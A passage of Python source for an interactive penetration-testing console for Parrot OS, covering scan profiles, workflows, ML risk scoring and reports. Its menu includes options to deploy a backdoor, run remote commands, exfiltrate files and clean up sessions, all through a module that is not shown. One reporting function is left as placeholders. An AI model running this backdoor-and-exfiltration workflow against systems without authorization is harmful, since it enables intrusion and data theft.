        # Ask about ML predictions
        ml_input = self.session.prompt(
            HTML('<prompt>Enable ML-based vulnerability prediction? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.use_ml_predictions = ml_input != "no"
        
        if self.use_ml_predictions and self.ml_predictor is None:
            try:
                self.ml_predictor = MLVulnerabilityPredictor()
                print("\033[92m[+] ML Vulnerability Predictor initialized successfully\033[0m")
            except Exception as e:
                print(f"\033[91m[!] Failed to initialize ML Vulnerability Predictor: {str(e)}\033[0m")
                self.use_ml_predictions = False
                
        print(f"\033[92m[+] ML-based vulnerability prediction: {'Enabled' if self.use_ml_predictions else 'Disabled'}\033[0m")

    # Post-exploitation methods
    def deploy_post_exploit_backdoor(self, target):
        """Deploy a post-exploitation backdoor on a target"""
        if not self.authorized_token:
            print("\033[91m[!] No authorization token configured. Please configure post-exploitation first.\033[0m")
            return

        result = self.post_exploit.deploy_backdoor(target)
        if result['success']:
            session_id = result['session_id']
            self.active_exploit_sessions[session_id] = result['details']
            print(f"\033[92m[+] Backdoor deployed successfully. Session ID: {session_id}\033[0m")
            return session_id
        else:
            print(f"\033[91m[!] Failed to deploy backdoor: {result['error']}\033[0m")
            return None

    def execute_post_exploit_command(self, session_id, command):
        """Execute a command through an existing post-exploitation session"""
        if session_id not in self.active_exploit_sessions:
            print("\033[91m[!] Invalid or inactive session ID\033[0m")
            return

        result = self.post_exploit.execute_command(session_id, command)
        if result['success']:
            print(f"\033[92m[+] Command executed successfully:\n{result['output']}\033[0m")
        else:
            print(f"\033[91m[!] Command execution failed: {result['error']}\033[0m")

    def gather_post_exploit_evidence(self, session_id, evidence_type='system_info'):
        """Gather evidence through an existing post-exploitation session"""
        if session_id not in self.active_exploit_sessions:
            print("\033[91m[!] Invalid or inactive session ID\033[0m")
            return

        result = self.post_exploit.gather_evidence(session_id, evidence_type)
        if result['success']:
            print(f"\033[92m[+] Evidence gathered successfully. Saved to: {result['evidence_dir']}\033[0m")
        else:
            print(f"\033[91m[!] Evidence gathering failed: {result['error']}\033[0m")

    def exfiltrate_post_exploit_data(self, session_id, target_files):
        """Exfiltrate data through an existing post-exploitation session"""
        if session_id not in self.active_exploit_sessions:
            print("\033[91m[!] Invalid or inactive session ID\033[0m")
            return

        result = self.post_exploit.exfiltrate_data(session_id, target_files)
        if result['success']:
            print(f"\033[92m[+] Data exfiltrated successfully. Saved to: {result['destination']}\033[0m")
            print(f"Successful: {len(result['exfiltration_results']['successful'])}, Failed: {len(result['exfiltration_results']['failed'])}")
        else:
            print(f"\033[91m[!] Data exfiltration failed: {result['error']}\033[0m")

    def cleanup_post_exploit_session(self, session_id):
        """Clean up a post-exploitation session"""
        if session_id not in self.active_exploit_sessions:
            print("\033[91m[!] Invalid or inactive session ID\033[0m")
            return

        result = self.post_exploit.cleanup_session(session_id)
        if result['success']:
            del self.active_exploit_sessions[session_id]
            print(f"\033[92m[+] Session cleaned up: {result['message']}\033[0m")
        else:
            print(f"\033[91m[!] Cleanup failed: {result['error']}\033[0m")

    def generate_post_exploit_report(self):
        """Generate a post-exploitation report"""
        result = self.post_exploit.generate_execution_report(report_format='html')
        if result['success']:
            print(f"\033[92m[+] Report generated at: {result['report_path']}\033[0m")
        else:
            print(f"\033[91m[!] Report generation failed: {result['error']}\033[0m")

    # Add a new method to create/save scan profiles
    def create_scan_profile(self):
        """Interactively create and save a scan profile"""
        print("\n\033[94m=== Create Scan Profile ===\033[0m")
        
        # Get profile name
        profile_name = self.session.prompt(HTML('<prompt>Enter profile name: </prompt>'))
        if not profile_name:
            print("\033[91m[!] Profile name is required. Aborting.\033[0m")
            return
        
        # Create a profile ID from the name
        profile_id = profile_name.lower().replace(" ", "_")
        
        # Get profile description
        description = self.session.prompt(HTML('<prompt>Enter profile description: </prompt>'))
        if not description:
            description = f"Custom profile created on {datetime.now().strftime('%Y-%m-%d')}"
        
        # Get other profile settings
        profile_data = {
            "name": profile_name,
            "description": description,
            "port_range": self.session.prompt(HTML('<prompt>Enter port range (default: 1-1024): </prompt>')) or "1-1024",
            "stealth_mode": self.session.prompt(HTML('<prompt>Enable stealth mode? (yes/no): </prompt>')).lower() == "yes",
            "max_concurrent": int(self.session.prompt(HTML('<prompt>Max concurrent tasks (default: 5): </prompt>')) or "5"),
        }
        
        # Configure scanners to use
        available_plugins = load_scanner_plugins()
        print("\n\033[94m[*] Available scanners:\033[0m")
        for i, scanner_name in enumerate(available_plugins):
            print(f"  {i+1}. {scanner_name}")
        
        selected_scanners = self.session.prompt(
            HTML('<prompt>Enter scanner numbers or names (comma-separated): </prompt>')
        )
        
        scanners_list = []
        if selected_scanners:
            for item in selected_scanners.split(","):
                item = item.strip()
                try:
                    # Try as index
                    idx = int(item) - 1
                    if 0 <= idx < len(available_plugins):
                        scanners_list.append(list(available_plugins.keys())[idx])
                except ValueError:
                    # Try as name
                    if item in available_plugins:
                        scanners_list.append(item)
        
        profile_data["scanners"] = scanners_list
        
        # Configure workflow
        workflow_steps = []
        print("\n\033[94m[*] Now let's configure the workflow steps\033[0m")
        print("    (specify the order of scanners and any special options per step)")
        
        for scanner in scanners_list:
            step = {"scanner": scanner, "options": {}}
            
            # Ask for scanner-specific options
            if scanner == "NmapScanner":
                step["options"]["port_range"] = profile_data["port_range"]
                step["options"]["stealth"] = profile_data["stealth_mode"]
            elif scanner == "NiktoScanner":
                step["options"]["deep_scan"] = self.session.prompt(
                    HTML(f'<prompt>Deep scan for {scanner}? (yes/no): </prompt>')
                ).lower() == "yes"
            elif scanner == "SQLMapScanner":
                step["options"]["risk"] = int(self.session.prompt(
                    HTML(f'<prompt>Risk level for {scanner} (1-3): </prompt>')
                ) or "1")
            
            workflow_steps.append(step)
        
        # Create the workflow
        profile_data["workflow"] = {
            "name": f"{profile_name} Workflow",
            "steps": workflow_steps
        }
        
        # Save the profile
        if self.profile_manager.save_profile(profile_id, profile_data):
            print(f"\033[92m[+] Profile '{profile_name}' saved successfully\033[0m")
        else:
            print(f"\033[91m[!] Failed to save profile '{profile_name}'\033[0m")

    def manage_profiles(self):
        """Manage existing scan profiles"""
        print("\n\033[94m=== Manage Scan Profiles ===\033[0m")
        
        # Show available profiles
        profile_ids = self.profile_manager.get_available_profiles()
        if not profile_ids:
            print("\033[93m[-] No profiles found.\033[0m")
            return
        
        print("\033[94m[*] Available profiles:\033[0m")
        for idx, profile_id in enumerate(profile_ids):
            profile = self.profile_manager.get_profile(profile_id)
            if profile:
                print(f"  {idx+1}. {profile['name']} - {profile['description']}")
        
        # Ask for action
        action = self.session.prompt(
            HTML('<prompt>Choose action (view/delete/export/back): </prompt>'),
            completer=WordCompleter(['view', 'delete', 'export', 'back'], ignore_case=True)
        ).lower()
        
        if action == "back":
            return
        
        # Get profile selection
        profile_choice = self.session.prompt(HTML('<prompt>Enter profile number or name: </prompt>'))
        
        # Find the selected profile
        selected_profile_id = None
        try:
            # Try as index
            idx = int(profile_choice) - 1
            if 0 <= idx < len(profile_ids):
                selected_profile_id = profile_ids[idx]
        except ValueError:
            # Try as profile_id
            if profile_choice in profile_ids:
                selected_profile_id = profile_choice
            else:
                # Try case-insensitive match
                for profile_id in profile_ids:
                    if profile_id.lower() == profile_choice.lower():
                        selected_profile_id = profile_id
                        break
        
        if not selected_profile_id:
            print("\033[91m[!] Profile not found.\033[0m")
            return
            
        selected_profile = self.profile_manager.get_profile(selected_profile_id)
        
        # Perform the selected action
        if action == "view":
            print(f"\n\033[94m=== Profile: {selected_profile['name']} ===\033[0m")
            print(json.dumps(selected_profile, indent=2))
        
        elif action == "delete":
            confirm = self.session.prompt(
                HTML(f'<prompt>Are you sure you want to delete "{selected_profile["name"]}"? (yes/no): </prompt>'),
                completer=WordCompleter(['yes', 'no'], ignore_case=True)
            ).lower()
            
            if confirm == "yes":
                if self.profile_manager.delete_profile(selected_profile_id):
                    print(f"\033[92m[+] Profile '{selected_profile['name']}' deleted successfully\033[0m")
                else:
                    print(f"\033[91m[!] Failed to delete profile '{selected_profile['name']}'\033[0m")
        
        elif action == "export":
            filename = self.session.prompt(
                HTML(f'<prompt>Enter filename to export (default: {selected_profile_id}.json): </prompt>')
            ) or f"{selected_profile_id}.json"
            
            try:
                with open(filename, 'w') as f:
                    json.dump(selected_profile, f, indent=2)
                print(f"\033[92m[+] Profile exported to {filename}\033[0m")
            except Exception as e:
                print(f"\033[91m[!] Failed to export profile: {str(e)}\033[0m")
    
    def run_profile(self):
        """Run tests based on selected profile with enhanced parallel execution"""
        valid_profiles = ["all", "network", "vulnerability", "exploitation", "anonymity", "auditing", "wireless"]
        if self.profile not in valid_profiles:
            print(f"\033[91m[!] Invalid profile. Use one of: {', '.join(valid_profiles)}\033[0m")
            return

        # Initialize result dictionaries for all targets
        for target in self.targets:
            self.results[target] = {}
            self.nmap_results[target] = {'ports': [], 'vulnerabilities': []}

        try:
            # Initialize progress monitoring if enabled
            if self.use_realtime_updates:
                self.progress_monitor = create_progress_monitor(console_output=True)
                print("\033[94m[*] Real-time progress monitoring enabled\033[0m")
            
            # Use workflow system if enabled and a profile is selected
            if self.use_workflow_system and self.selected_profile_id:
                print(f"\033[94m[*] Running workflow scan using profile '{self.selected_profile_id}'\033[0m")
                success = self.run_workflow_scan()
                if not success:
                    # Fall back to standard scan method
                    print("\033[93m[-] Falling back to standard scan method\033[0m")
                    self.run_legacy_scan()
            elif self.use_plugin_system:
                print(f"\033[94m[*] Running plugin-based scan with profile '{self.profile}'\033[0m")
                self.run_plugin_scan()
            else:
                print(f"\033[94m[*] Running standard scan with profile '{self.profile}'\033[0m")
                # Use original implementation
                self.run_legacy_scan()
                
            # Generate recommendations regardless of scan method
            if self.results:
                self.recommendations = get_recommendations_for_results(self.results)
                print(f"\033[92m[+] Generated {len(self.recommendations)} security recommendations\033[0m")
                
                # Generate ML-based risk assessment if enabled
                if self.use_ml_predictions:
                    print("\033[94m[*] Generating ML-based risk assessment...\033[0m")
                    try:
                        self.ml_risk_assessments = get_risk_assessment_for_results(self.results)
                        num_assessments = len([v for v in self.ml_risk_assessments.values() if not (isinstance(v, dict) and 'error' in v)])
                        print(f"\033[92m[+] Generated ML-based risk assessments for {num_assessments} targets\033[0m")
                    except Exception as e:
                        self.logger.error(f"Error generating ML risk assessment: {str(e)}")
                        print(f"\033[91m[!] Error generating ML risk assessment: {str(e)}\033[0m")
                
            # Generate reports
            self.save_report()
            self.generate_enhanced_report()
            
        except Exception as e:
            logging.error(f"Error in run_profile: {str(e)}")
            print(f"\033[91m[!] Error in test execution: {str(e)}. Continuing with remaining tests...\033[0m")
        finally:
            # Stop progress monitoring
            if self.progress_monitor:
                self.progress_monitor.stop()
                self.progress_monitor = None

    def run_workflow_scan(self):
        """Run scan using the workflow system"""
        profile = self.profile_manager.get_profile(self.selected_profile_id)
        if not profile or not profile.get("workflow"):
            print(f"\033[91m[!] Profile {self.selected_profile_id} doesn't have a valid workflow. Falling back to standard scanning.\033[0m")
            return False
        
        try:
            # Create an event loop if none exists
            try:
                loop = asyncio.get_event_loop()
            except RuntimeError:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            
            # Initialize workflow manager
            self.workflow_manager = WorkflowManager(self.progress_monitor)
            
            # Run the workflow from profile
            workflow_results = loop.run_until_complete(
                run_workflow_from_profile(profile, self.targets, self.progress_monitor)
            )
            
            # Store results in standard format
            for target, target_results in workflow_results.items():
                self.results[target] = target_results
                
                # Extract Nmap results for compatibility with other functions
                if "NmapScanner" in target_results:
                    self.nmap_results[target] = {
                        'ports': target_results["NmapScanner"].get('ports', []),
                        'vulnerabilities': target_results["NmapScanner"].get('vulnerabilities', [])
                    }
                
                # Store data in database
                self._store_scan_results(target, target_results)
            
            print(f"\033[92m[+] Workflow scan completed successfully\033[0m")
            return True
            
        except Exception as e:
            logging.error(f"Error in workflow scan: {str(e)}")
            print(f"\033[91m[!] Error in workflow scan: {str(e)}. Falling back to standard scanning.\033[0m")
            return False
    
    def _store_scan_results(self, target, target_results):
        """Store scan results in the database"""
        # Get or create target record
        self.cursor.execute("SELECT id FROM targets WHERE ip = ?", (target,))
        target_record = self.cursor.fetchone()
        
        if not target_record:
            # Create a new target record
            timestamp = datetime.now().isoformat()
            
            # Try to extract additional info from nmap results
            mac = None
            os_name = None
            version = None
            if "NmapScanner" in target_results:
                nmap_results = target_results["NmapScanner"]
                host_info = nmap_results.get("host_info", {})
                mac = host_info.get("mac")
                os_info = nmap_results.get("os_info", {})
                os_name = os_info.get("name")
                version = os_info.get("version")
            
            self.cursor.execute(
                "INSERT INTO targets (ip, mac, os, version, scan_timestamp) VALUES (?, ?, ?, ?, ?)",
                (target, mac, os_name, version, timestamp)
            )
            target_id = self.cursor.lastrowid
        else:
            target_id = target_record[0]
        
        # Store ports
        if "NmapScanner" in target_results and "ports" in target_results["NmapScanner"]:
            for port_info in target_results["NmapScanner"]["ports"]:
                self.cursor.execute(
                    "INSERT INTO ports (target_id, port, service, version) VALUES (?, ?, ?, ?)",
                    (target_id, port_info['port'], port_info.get('service', ''), port_info.get('version', ''))
                )
        
        # Store vulnerabilities
        for scanner_name, scanner_results in target_results.items():
            if isinstance(scanner_results, dict) and "vulnerabilities" in scanner_results:
                for vuln in scanner_results["vulnerabilities"]:
                    # Get CVE details if available
                    cve_details = {"score": 0, "description": ""}
                    if vuln.get("cve"):
                        cve_details = self.fetch_cve_details(vuln["cve"])
                    
                    self.store_vulnerability(
                        target_id,
                        vuln.get("port", 0),
                        vuln.get("script", scanner_name),
                        vuln.get("output", "No output"),
                        vuln.get("cve"),
                        cve_details.get("score", 0),
                        cve_details.get("description", "")
                    )
        
        # Store test results
        for scanner_name, scanner_results in target_results.items():
            if isinstance(scanner_results, dict):
                # Create a summary
                result_summary = f"[SUCCESS] {scanner_name}\n"
                
                # Add scanner-specific details
                if scanner_name == "NmapScanner" and "ports" in scanner_results:
                    result_summary += f"Found {len(scanner_results['ports'])} open ports\n"
                elif "vulnerabilities" in scanner_results:
                    result_summary += f"Found {len(scanner_results['vulnerabilities'])} vulnerabilities\n"
                
                # Add output if available
                if "raw_output" in scanner_results:
                    excerpt_len = 500
                    raw_output = scanner_results["raw_output"]
                    excerpt = raw_output[:excerpt_len] + "..." if len(raw_output) > excerpt_len else raw_output
                    result_summary += f"\nOutput excerpt:\n{excerpt}\n"
                
                # Store in database
                self.store_test_result(target_id, scanner_name, result_summary)

    def show_recommendations(self):
        """Show recommendations based on scan results"""
        if not self.recommendations:
            print("\033[93m[-] No recommendations available. Run a scan first.\033[0m")
            return
        
        print("\n\033[94m=== Security Recommendations ===\033[0m")
        
        # Group recommendations by severity
        severity_groups = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        
        for rec in self.recommendations:
            severity = rec.get("severity", "info").lower()
            if severity in severity_groups:
                severity_groups[severity].append(rec)
            else:
                severity_groups["info"].append(rec)
        
        # Display recommendations by severity
        for severity in ["critical", "high", "medium", "low", "info"]:
            group = severity_groups[severity]
            if not group:
                continue
                
            # Choose color based on severity
            if severity == "critical":
                color = "\033[91m"  # Red
            elif severity == "high":
                color = "\033[93m"  # Yellow
            elif severity == "medium":
                color = "\033[95m"  # Magenta
            elif severity == "low":
                color = "\033[94m"  # Blue
            else:
                color = "\033[92m"  # Green
                
            print(f"\n{color}=== {severity.upper()} SEVERITY RECOMMENDATIONS ({len(group)}) ===\033[0m")
            
            for i, rec in enumerate(group):
                target = rec.get("target", "general")
                print(f"\n{color}{i+1}. {rec['title']}\033[0m")
                print(f"   Target: {target}")
                print(f"   Details: {rec['details']}")
                
                if "actions" in rec:
                    print("   Recommended actions:")
                    for action in rec["actions"]:
                        print(f"    * {action}")
    
        # Ask if user wants to save recommendations
        save_option = self.session.prompt(
            HTML('<prompt>Save recommendations to file? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        
        if save_option == "yes":
            filename = self.session.prompt(
                HTML('<prompt>Enter filename (default: recommendations.txt): </prompt>')
            ) or "recommendations.txt"
            
            try:
                with open(filename, 'w') as f:
                    f.write(f"Security Recommendations - {datetime.now().isoformat()}\n\n")
                    
                    # Write recommendations by severity
                    for severity in ["critical", "high", "medium", "low", "info"]:
                        group = severity_groups[severity]
                        if not group:
                            continue
                        
                        f.write(f"\n=== {severity.upper()} SEVERITY RECOMMENDATIONS ({len(group)}) ===\n\n")
                        
                        for i, rec in enumerate(group):
                            target = rec.get("target", "general")
                            f.write(f"{i+1}. {rec['title']}\n")
                            f.write(f"   Target: {target}\n")
                            f.write(f"   Details: {rec['details']}\n")
                            
                            if "actions" in rec:
                                f.write("   Recommended actions:\n")
                                for action in rec["actions"]:
                                    f.write(f"    * {action}\n")
                            f.write("\n")
                
                print(f"\033[92m[+] Recommendations saved to {filename}\033[0m")
            except Exception as e:
                print(f"\033[91m[!] Error saving recommendations: {str(e)}\033[0m")

    def save_report_with_recommendations(self, formats=None):
        """Save results to specified formats with recommendations included"""
        if not formats:
            formats = ['text', 'html', 'csv']

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f"interactive_test_report_{timestamp}.txt"
        html_report_file = f"interactive_test_report_{timestamp}.html"
        csv_report_file = f"interactive_test_report_{timestamp}.csv"

        # Fetch data from database
        # ...existing report generation code...

        # Add recommendations section to reports
        try:
            if 'text' in formats:
                with open(report_file, "w") as f:
                    # ...existing text report code...
                    
                    # Add recommendations section
                    if self.recommendations:
                        f.write("\n\nSECURITY RECOMMENDATIONS\n")
                        f.write("=" * 50 + "\n\n")
                        
                        # Group by severity
                        severity_groups = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
                        for rec in self.recommendations:
                            severity = rec.get("severity", "info").lower()
                            if severity in severity_groups:
                                severity_groups[severity].append(rec)
                            
                        # Write by severity
                        for severity in ["critical", "high", "medium", "low", "info"]:
                            group = severity_groups[severity]
                            if not group:
                                continue
                                
                            f.write(f"{severity.upper()} SEVERITY RECOMMENDATIONS ({len(group)})\n")
                            f.write("-" * 40 + "\n")
                            
                            for i, rec in enumerate(group):
                                target = rec.get("target", "general")
                                f.write(f"{i+1}. {rec['title']}\n")
                                f.write(f"   Target: {target}\n")
                                f.write(f"   Details: {rec['details']}\n")
                                
                                if "actions" in rec:
                                    f.write("   Recommended actions:\n")
                                    for action in rec["actions"]:
                                        f.write(f"    * {action}\n")
                                f.write("\n")

            if 'html' in formats:
                # ...existing HTML report code...
                
                # Update template to include recommendations
                template = env.get_template("report.html")
                html_content = template.render(
                    timestamp=datetime.now().isoformat(),
                    results=self.results,
                    targets=list(target_ports.values()),
                    test_results=test_results,
                    vulnerabilities=vulnerabilities,
                    recommendations=self.recommendations
                )
                
                # ...save HTML report...
            
            # ...existing report code for other formats...
        except Exception as e:
            logging.error(f"Error saving report: {str(e)}")
            print(f"\033[91m[!] Error saving report: {str(e)}\033[0m")

    def analyze_with_ml_predictions(self, target=None):
        """Run ML-based vulnerability predictions on a target or all targets"""
        if not self.use_ml_predictions or not self.ml_predictor:
            print("\033[93m[-] ML-based prediction is not enabled or initialized\033[0m")
            return
        
        targets_to_analyze = [target] if target else self.targets
        if not targets_to_analyze:
            print("\033[93m[-] No targets selected for ML analysis\033[0m")
            return
        
        print("\033[94m[*] Running ML-based vulnerability predictions...\033[0m")
        
        for target in targets_to_analyze:
            if target not in self.results:
                print(f"\033[93m[-] No scan results available for {target}\033[0m")
                continue
                
            # Extract service information
            services = []
            if "NmapScanner" in self.results[target] and "ports" in self.results[target]["NmapScanner"]:
                for port_info in self.results[target]["NmapScanner"]["ports"]:
                    services.append({
                        'name': port_info.get('service', 'unknown'),
                        'version': port_info.get('version', ''),
                        'port': port_info.get('port', 0)
                    })
            
            if not services:
                print(f"\033[93m[-] No service information available for {target}\033[0m")
                continue
                
            try:
                # Get ML predictions
                predictions = self.ml_predictor.predict_service_vulnerabilities(services)
                self.ml_predictions[target] = predictions
                
                # Display predictions
                print(f"\n\033[94m=== ML Predictions for {target} ===\033[0m")
                if predictions:
                    for pred in predictions:
                        service = pred['service']
                        prob = pred['probability']
                        
                        # Choose color based on probability
                        if prob > 0.7:
                            color = "\033[91m"  # Red for high probability
                        elif prob > 0.5:
                            color = "\033[93m"  # Yellow for medium probability
                        else:
                            color = "\033[92m"  # Green for low probability
                        
                        print(f"{color}Service: {service['name']} on port {service['port']}")
                        print(f"Version: {service.get('version', 'unknown')}")
                        print(f"Vulnerability probability: {prob:.2f}")
                        print(f"Prediction: {pred['prediction']}\033[0m")
                        
                        if pred.get('potential_cves'):
                            print("Potential CVEs:")
                            for cve in pred['potential_cves'][:3]:  # Show top 3 CVEs
                                print(f"  - {cve['id']}: {cve['summary']}")
                        print()
                else:
                    print("\033[92m[+] No significant vulnerabilities predicted\033[0m")
                    
                # Get risk assessment
                if target in self.ml_risk_assessments:
                    assessment = self.ml_risk_assessments[target]
                    if isinstance(assessment, dict) and 'risk_level' in assessment:
                        # Choose color based on risk level
                        if assessment['risk_level'] == 'Critical':
                            color = "\033[91m"  # Red
                        elif assessment['risk_level'] == 'High':
                            color = "\033[93m"  # Yellow
                        elif assessment['risk_level'] == 'Medium':
                            color = "\033[95m"  # Magenta
                        else:
                            color = "\033[92m"  # Green
                            
                        print(f"{color}Overall Risk Assessment:")
                        print(f"Risk Level: {assessment['risk_level']} ({assessment['risk_score']:.1f}/100)")
                        if assessment.get('high_risk_services'):
                            print("High-risk services:")
                            for service in assessment['high_risk_services']:
                                print(f"  - {service['name']} on port {service['port']} (score: {service['risk_score']:.1f})")
                        if assessment.get('recommendations'):
                            print("Recommendations:")
                            for rec in assessment['recommendations']:
                                print(f"  - {rec}")
                        print("\033[0m")  # Reset color
            except Exception as e:
                self.logger.error(f"Error in ML analysis for {target}: {str(e)}")
                print(f"\033[91m[!] Error in ML analysis for {target}: {str(e)}\033[0m")

    def main_menu(self):
        """Main interactive menu"""
        self.logger.info("Starting Interactive System Tester main menu")
        print("\033[94m=== Welcome to Interactive System Tester for Parrot OS ===\033[0m")
        print("Type 'exit' or press Ctrl+C to quit.\n")
        
        while True:
            # Update completer with ML options
            self.completer = WordCompleter([
                'all', 'network', 'vulnerability', 'exploitation', 'anonymity', 'auditing', 'wireless',
                'yes', 'no', 'verbose', 'quiet', '127.0.0.1', 'lan',
                'configure', 'targets', 'run', 'export', 'exit', 'query_db', 'enhanced_report',
                'configure_automation', 'create_profile', 'manage_profiles', 'show_recommendations',
                'ml_predict', 'ml_risk_assessment', 'train_ml_model',
                'text', 'html', 'enhanced_html', 'csv',
                'post_exploit_deploy', 'post_exploit_command', 'post_exploit_evidence',
                'post_exploit_exfiltrate', 'post_exploit_cleanup', 'post_exploit_report'
            ], ignore_case=True)
            
            self.session = PromptSession(
                style=self.style,
                completer=self.completer,
                key_bindings=self.bindings,
                multiline=False,
                prompt_message=HTML('<prompt>SystemTester> </prompt>')
            )
            
            choice = self.session.prompt(
                HTML('<prompt>Choose an action (configure/targets/run/export/query_db/enhanced_report/create_profile/manage_profiles/show_recommendations/ml_predict/ml_risk_assessment/train_ml_model/configure_automation/exit/post_exploit_deploy/post_exploit_command/post_exploit_evidence/post_exploit_exfiltrate/post_exploit_cleanup/post_exploit_report): </prompt>')
            ).lower()
            
            self.logger.info(f"User selected menu option: {choice}")

            if choice == "exit":
                if self.use_tor and self.check_tool("anonsurf"):
                    self.logger.debug("Stopping AnonSurf before exit")
                    subprocess.run("anonsurf stop", shell=True, capture_output=True, text=True)
                self.conn.close()
                self.logger.info("Database connection closed, exiting application")
                print("\033[92m[+] Exiting System Tester. Goodbye!\033[0m")
                break
            elif choice == "configure":
                self.logger.info("User is configuring system settings")
                self.configure_settings()
            elif choice == "targets":
                self.logger.info("User is selecting targets")
                self.select_targets()
            elif choice == "run":
                if not self.targets:
                    self.logger.warning("Attempted to run scan without targets selected")
                    print("\033[93m[-] No targets selected. Please select targets first.\033[0m")
                    continue
                self.logger.info(f"Starting tests with profile '{self.profile}' on {len(self.targets)} targets")
                print(f"\n\033[94m[*] Starting tests with profile '{self.profile}' on {len(self.targets)} targets...\033[0m")
                start_time = time.time()
                self.run_profile()
                end_time = time.time()
                self.logger.info(f"Testing completed in {end_time - start_time:.2f} seconds")
                print(f"\033[92m[+] Testing completed in {end_time - start_time:.2f} seconds\033[0m")
            elif choice == "export":
                self.export_reports()
            elif choice == "query_db":
                self.query_db()
            elif choice == "enhanced_report":
                self.generate_enhanced_report()
            elif choice == "create_profile":
                self.create_scan_profile()
            elif choice == "manage_profiles":
                self.manage_profiles()
            elif choice == "show_recommendations":
                self.show_recommendations()
            elif choice == "configure_automation":
                self.configure_automation()
            elif choice == "ml_predict":
                if not self.targets:
                    print("\033[93m[-] No targets selected. Please select targets first.\033[0m")
                    continue
                    
                if not self.results:
                    print("\033[93m[-] No scan results available. Please run a scan first.\033[0m")
                    continue
                    
                if len(self.targets) > 1:
                    target_choice = self.session.prompt(
                        HTML('<prompt>Choose a target or "all" (default: all): </prompt>'),
                        completer=WordCompleter(['all'] + self.targets, ignore_case=True)
                    )
                    if not target_choice or target_choice.lower() == 'all':
                        self.analyze_with_ml_predictions()
                    else:
                        if target_choice in self.targets:
                            self.analyze_with_ml_predictions(target_choice)
                        else:
                            print(f"\033[93m[-] Invalid target: {target_choice}\033[0m")
                else:
                    self.analyze_with_ml_predictions(self.targets[0])
            elif choice == "ml_risk_assessment":
                if not self.targets or not self.results:
                    print("\033[93m[-] No targets or scan results available. Please run a scan first.\033[0m")
                    continue
                    
                if not self.ml_risk_assessments:
                    print("\033[94m[*] Generating ML-based risk assessment...\033[0m")
                    try:
                        self.ml_risk_assessments = get_risk_assessment_for_results(self.results)
                    except Exception as e:
                        print(f"\033[91m[!] Error generating risk assessment: {str(e)}\033[0m")
                        continue
                
                # Display risk assessments
                print("\n\033[94m=== ML-Based Risk Assessment ===\033[0m")
                for target, assessment in self.ml_risk_assessments.items():
                    if not isinstance(assessment, dict) or 'error' in assessment:
                        print(f"\033[93m[-] No valid risk assessment for {target}\033[0m")
                        continue
                        
                    # Choose color based on risk level
                    risk_level = assessment.get('risk_level', 'Unknown')
                    if risk_level == 'Critical':
                        color = "\033[91m"  # Red
                    elif risk_level == 'High':
                        color = "\033[93m"  # Yellow
                    elif risk_level == 'Medium':
                        color = "\033[95m"  # Magenta
                    else:
                        color = "\033[92m"  # Green
                        
                    print(f"\n{color}Target: {target}")
                    print(f"Risk Level: {risk_level} ({assessment.get('risk_score', 0):.1f}/100)")
                    
                    if assessment.get('high_risk_services'):
                        print("High-risk services:")
                        for service in assessment['high_risk_services']:
                            print(f"  - {service['name']} on port {service['port']} (score: {service['risk_score']:.1f})")
                    
                    if assessment.get('recommendations'):
                        print("Recommendations:")
                        for rec in assessment['recommendations']:
                            print(f"  - {rec}")
                    print("\033[0m")  # Reset color
            elif choice == "train_ml_model":
                print("\n\033[94m=== Train ML Prediction Model ===\033[0m")
                
                if not self.use_ml_predictions or not self.ml_predictor:
                    try:
                        self.ml_predictor = MLVulnerabilityPredictor()
                        self.use_ml_predictions = True
                        print("\033[92m[+] ML Vulnerability Predictor initialized\033[0m")
                    except Exception as e:
                        print(f"\033[91m[!] Failed to initialize ML Vulnerability Predictor: {str(e)}\033[0m")
                        continue
                
                confirm = self.session.prompt(
                    HTML('<prompt>This will train/retrain the ML model. Continue? (yes/no): </prompt>'),
                    completer=WordCompleter(['yes', 'no'], ignore_case=True)
                ).lower()
                
                if confirm != "yes":
                    print("\033[93m[-] Training cancelled\033[0m")
                    continue
                
                print("\033[94m[*] Training ML model... This might take a while\033[0m")
                try:
                    success = self.ml_predictor.train_models(force=True)
                    if success:
                        print("\033[92m[+] ML model trained successfully\033[0m")
                    else:
                        print("\033[93m[-] ML model training completed with issues\033[0m")
                except Exception as e:
                    print(f"\033[91m[!] Error training ML model: {str(e)}\033[0m")
            # Post-exploitation actions
            elif choice == "post_exploit_deploy":
                if not self.targets:
                    print("\033[93m[-] No targets selected. Please select targets first.\033[0m")
                    continue
                target = self.session.prompt(
                    HTML('<prompt>Enter target IP to deploy backdoor (or press Enter for first target): </prompt>')
                ) or self.targets[0]
                self.deploy_post_exploit_backdoor(target)
            elif choice == "post_exploit_command":
                session_id = self.session.prompt(
                    HTML('<prompt>Enter session ID: </prompt>')
                )
                command = self.session.prompt(
                    HTML('<prompt>Enter command to execute: </prompt>')
                )
                self.execute_post_exploit_command(session_id, command)
            elif choice == "post_exploit_evidence":
                session_id = self.session.prompt(
                    HTML('<prompt>Enter session ID: </prompt>')
                )
                evidence_type = self.session.prompt(
                    HTML('<prompt>Enter evidence type (system_info/network/users/processes): </prompt>'),
                    completer=WordCompleter(['system_info', 'network', 'users', 'processes'], ignore_case=True)
                ) or 'system_info'
                self.gather_post_exploit_evidence(session_id, evidence_type)
            elif choice == "post_exploit_exfiltrate":
                session_id = self.session.prompt(
                    HTML('<prompt>Enter session ID: </prompt>')
                )
                files = self.session.prompt(
                    HTML('<prompt>Enter file paths to exfiltrate (comma-separated): </prompt>')
                )
                target_files = [f.strip() for f in files.split(',') if f.strip()]
                self.exfiltrate_post_exploit_data(session_id, target_files)
            elif choice == "post_exploit_cleanup":
                session_id = self.session.prompt(
                    HTML('<prompt>Enter session ID to clean up: </prompt>')
                )
                self.cleanup_post_exploit_session(session_id)
            elif choice == "post_exploit_report":
                self.generate_post_exploit_report()
            else:
                print("\033[93m[-] Invalid choice. Options: configure, targets, run, export, query_db, enhanced_report, create_profile, manage_profiles, show_recommendations, ml_predict, ml_risk_assessment, train_ml_model, configure_automation, exit, post_exploit_deploy, post_exploit_command, post_exploit_evidence, post_exploit_exfiltrate, post_exploit_cleanup, post_exploit_report\033[0m")

def main():
    try:
        # Replace os.geteuid() with a cross-platform solution
